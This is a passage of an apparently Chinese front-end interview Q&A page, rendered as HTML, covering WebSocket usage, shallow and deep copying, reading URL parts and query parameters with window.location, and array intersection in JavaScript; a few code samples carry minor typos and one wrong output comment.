ws<span class="token punctuation">.</span><span class="token function-variable function">onopen</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    ws<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Hello there!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
ws<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ol>
<h3 id="46、浅拷贝，深拷贝-实现方式"><a href="#46、浅拷贝，深拷贝-实现方式" class="headerlink" title="46、浅拷贝，深拷贝(实现方式)"></a>46、浅拷贝，深拷贝(实现方式)</h3><p><strong>参考答案：</strong></p>
<p>浅拷贝和深拷贝都只针对于引用数据类型，浅拷贝只复制指向某个对象的指针，而不复制对象本身，新旧对象还是共享同一块内存；但深拷贝会另外创造一个一模一样的对象，新对象跟原对象不共享内存，修改新对象不会改到原对象；</p>
<p>区别：浅拷贝只复制对象的第一层属性、深拷贝可以对对象的属性进行递归复制；</p>
<p>实现浅拷贝方法</p>
<p>（1）Object.assign方法</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
    <span class="token literal-property property">b</span><span class="token operator">:</span> <span class="token number">2</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">var</span> obj1 <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
boj1<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>a<span class="token punctuation">)</span> <span class="token comment">// 3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>（2）for in方法</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">// 只复制第一层的浅拷贝</span>
<span class="token keyword">function</span> <span class="token function">simpleCopy</span><span class="token punctuation">(</span><span class="token parameter">obj1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
   <span class="token keyword">var</span> obj2 <span class="token operator">=</span> Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>obj1<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
   <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token keyword">in</span> obj1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
   obj2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> obj1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
   <span class="token keyword">return</span> obj2<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">var</span> obj1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
   <span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
   <span class="token literal-property property">b</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>
   <span class="token literal-property property">c</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
         <span class="token literal-property property">d</span><span class="token operator">:</span> <span class="token number">3</span>
      <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">var</span> obj2 <span class="token operator">=</span> <span class="token function">simpleCopy</span><span class="token punctuation">(</span>obj1<span class="token punctuation">)</span><span class="token punctuation">;</span>
obj2<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
obj2<span class="token punctuation">.</span>c<span class="token punctuation">.</span>d <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
<span class="token function">alert</span><span class="token punctuation">(</span>obj1<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1</span>
<span class="token function">alert</span><span class="token punctuation">(</span>obj2<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 3</span>
<span class="token function">alert</span><span class="token punctuation">(</span>obj1<span class="token punctuation">.</span>c<span class="token punctuation">.</span>d<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 4</span>
<span class="token function">alert</span><span class="token punctuation">(</span>obj2<span class="token punctuation">.</span>c<span class="token punctuation">.</span>d<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 4</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>实现深拷贝方法</p>
<p>（1）采用递归去拷贝所有层级属性</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">deepClone</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> objClone <span class="token operator">=</span> Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>obj <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> obj<span class="token operator">===</span><span class="token string">"object"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span>key <span class="token keyword">in</span> obj<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span><span class="token function">hasOwnProperty</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token comment">//判断ojb子元素是否为对象，如果是，递归复制</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span>obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span><span class="token keyword">typeof</span> obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">===</span><span class="token string">"object"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                    objClone<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">deepClone</span><span class="token punctuation">(</span>obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
                    <span class="token comment">//如果不是，简单复制</span>
                    objClone<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> objClone<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>    
<span class="token keyword">let</span> a<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    b<span class="token operator">=</span><span class="token function">deepClone</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>（2）使用JSON.stringify和JSON.parse实现深拷贝：JSON.stringify把对象转成字符串，再用JSON.parse把字符串转成新的对象；</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">deepCopy</span><span class="token punctuation">(</span><span class="token parameter">obj1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> _obj <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>obj1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> obj2 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>_obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> obj2<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
    <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> b <span class="token operator">=</span> <span class="token function">deepCopy</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    b<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token function">alert</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1,1,2,3,4</span>
    <span class="token function">alert</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 2,2,2,3,4</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>（3）热门的函数库lodash，也有提供_.cloneDeep用来做深拷贝；</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> _ <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'lodash'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> obj1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
    <span class="token literal-property property">b</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">f</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">g</span><span class="token operator">:</span> <span class="token number">1</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token literal-property property">c</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> obj2 <span class="token operator">=</span> _<span class="token punctuation">.</span><span class="token function">cloneDeep</span><span class="token punctuation">(</span>obj1<span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj1<span class="token punctuation">.</span>b<span class="token punctuation">.</span>f <span class="token operator">===</span> obj2<span class="token punctuation">.</span>b<span class="token punctuation">.</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// false</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="47、获取当前页面url"><a href="#47、获取当前页面url" class="headerlink" title="47、获取当前页面url"></a>47、获取当前页面url</h3><p><strong>参考答案：</strong></p>
<ol>
<li>window.location.href (设置或获取整个 URL 为字符串)</li>
</ol>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> test <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token punctuation">;</span>
<span class="token function">alert</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//  返回：http://i.cnblogs.com/EditPosts.aspx?opt=1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<ol>
<li>window.location.protocol (设置或获取 URL 的协议部分)</li>
</ol>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> test <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>protocol<span class="token punctuation">;</span>
<span class="token function">alert</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//返回：http:</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<ol>
<li>window.location.host (设置或获取 URL 的主机部分)</li>
</ol>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> test <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>host<span class="token punctuation">;</span>
<span class="token function">alert</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//返回：i.cnblogs.com</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<ol>
<li>window.location.port (设置或获取与 URL 关联的端口号码)</li>
</ol>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> test <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>port<span class="token punctuation">;</span>
<span class="token function">alert</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//返回：空字符(如果采用默认的80端口 (update:即使添加了:80)，那么返回值并不是默认的80而是空字符)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<ol>
<li>window.location.pathname (设置或获取与 URL 的路径部分（就是文件地址）)</li>
</ol>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> test <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>pathname<span class="token punctuation">;</span>
<span class="token function">alert</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//返回：/EditPosts.aspx</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<ol>
<li>window.location.search (设置或获取 href 属性中跟在问号后面的部分)</li>
</ol>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> test <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">;</span>
<span class="token function">alert</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//返回：?opt=1</span>
（<span class="token constant">PS</span>：获得查询（参数）部分，除了给动态语言赋值以外，我们同样可以给静态页面，并使用javascript来获得相信应的参数值。）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<ol>
<li>window.location.hash (设置或获取 href 属性中在井号“#”后面的分段)</li>
</ol>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> test <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">;</span>
<span class="token function">alert</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//返回：空字符(因为url中没有)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<ol>
<li><p>js获取url中的参数值*</p>
<p>正则法</p>
</li>
</ol>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"> <span class="token keyword">function</span> <span class="token function">getQueryString</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">var</span> reg <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span><span class="token string">'(^|&amp;)'</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">'=([^&amp;]*)(&amp;|$)'</span><span class="token punctuation">,</span> <span class="token string">'i'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">var</span> r <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>reg<span class="token punctuation">)</span><span class="token punctuation">;</span>

          <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
             <span class="token keyword">return</span> <span class="token function">unescape</span><span class="token punctuation">(</span>r<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token comment">// 这样调用：</span>
<span class="token function">alert</span><span class="token punctuation">(</span><span class="token function">GetQueryString</span><span class="token punctuation">(</span><span class="token string">"参数名1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">alert</span><span class="token punctuation">(</span><span class="token function">GetQueryString</span><span class="token punctuation">(</span><span class="token string">"参数名2"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">alert</span><span class="token punctuation">(</span><span class="token function">GetQueryString</span><span class="token punctuation">(</span><span class="token string">"参数名3"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p> split拆分法</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">GetRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
         <span class="token keyword">var</span> url <span class="token operator">=</span> location<span class="token punctuation">.</span>search<span class="token punctuation">;</span> <span class="token comment">//获取url中"?"符后的字串</span>
         <span class="token keyword">var</span> theRequest <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

         <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"?"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                 <span class="token keyword">var</span> str <span class="token operator">=</span> url<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                 strs <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"&amp;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> strs<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i <span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                      theRequest<span class="token punctuation">[</span>strs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">unescape</span><span class="token punctuation">(</span>strs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
               <span class="token punctuation">&#125;</span>
         <span class="token punctuation">&#125;</span>
     <span class="token keyword">return</span> theRequest<span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
<span class="token keyword">var</span> Request <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
Request <span class="token operator">=</span> <span class="token function">GetRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token comment">// var id=Request["id"]; </span>
<span class="token comment">// var 参数1,参数2,参数3,参数N;</span>
<span class="token comment">// 参数1 = Request['参数1'];</span>
<span class="token comment">// 参数2 = Request['参数2'];</span>
<span class="token comment">// 参数3 = Request['参数3'];</span>
<span class="token comment">// 参数N = Request['参数N'];</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p> 指定取<br>比如说一个url：<a target="_blank" rel="noopener" href="https://link.jianshu.com/?t=http://i.cnblogs.com/?j=js">http://i.cnblogs.com/?j=js</a>, 我们想得到参数j的值，可以通过以下函数调用。</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">GetQueryString</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
         <span class="token keyword">var</span> reg <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span><span class="token string">"(^|&amp;)"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">"=([^&amp;]*)(&amp;|$)"</span><span class="token punctuation">,</span> <span class="token string">"i"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
         <span class="token keyword">var</span> r <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>reg<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//获取url中"?"符后的字符串并正则匹配</span>
         <span class="token keyword">var</span> context <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span> 

     <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> 
     context <span class="token operator">=</span> r<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
    reg <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span> 
    r <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span> 
    <span class="token keyword">return</span> context <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> context <span class="token operator">==</span> <span class="token string">""</span> <span class="token operator">||</span> context <span class="token operator">==</span> <span class="token string">"undefined"</span> <span class="token operator">?</span> <span class="token string">""</span> <span class="token operator">:</span> context<span class="token punctuation">;</span> 
 <span class="token punctuation">&#125;</span>
<span class="token function">alert</span><span class="token punctuation">(</span><span class="token function">GetQueryString</span><span class="token punctuation">(</span><span class="token string">"j"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p> 单个参数的获取方法</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">GetRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
         <span class="token keyword">var</span> url <span class="token operator">=</span> location<span class="token punctuation">.</span>search<span class="token punctuation">;</span> <span class="token comment">//获取url中"?"符后的字串</span>
         <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"?"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token operator">?</span> <span class="token comment">//判断是否有参数</span>
                  <span class="token keyword">var</span> str <span class="token operator">=</span> url<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//从第一个字符开始 因为第0个是?号 获取所有除问号的所有符串</span>
                  strs <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span> <span class="token comment">//用等号进行分隔 （因为知道只有一个参数 </span>
                                          <span class="token comment">//所以直接用等号进分隔 如果有多个参数 要用&amp;号分隔 再用等号进行分隔）</span>
                  <span class="token function">alert</span><span class="token punctuation">(</span>strs<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">??</span><span class="token operator">??</span> <span class="token comment">//直接弹出第一个参数 （如果有多个参数 还要进行循环的）</span>
         <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>





<h3 id="48、js中两个数组怎么取交集-差集、并集、补集"><a href="#48、js中两个数组怎么取交集-差集、并集、补集" class="headerlink" title="48、js中两个数组怎么取交集+(差集、并集、补集)"></a>48、js中两个数组怎么取交集+(差集、并集、补集)</h3><h4 id="ES5："><a href="#ES5：" class="headerlink" title="ES5："></a>ES5：</h4><p>交集：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> arr1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> arr2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">getIntersection</span><span class="token punctuation">(</span><span class="token parameter">arr1<span class="token punctuation">,</span> arr2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">let</span> newArr <span class="token operator">=</span> arr1<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr2<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
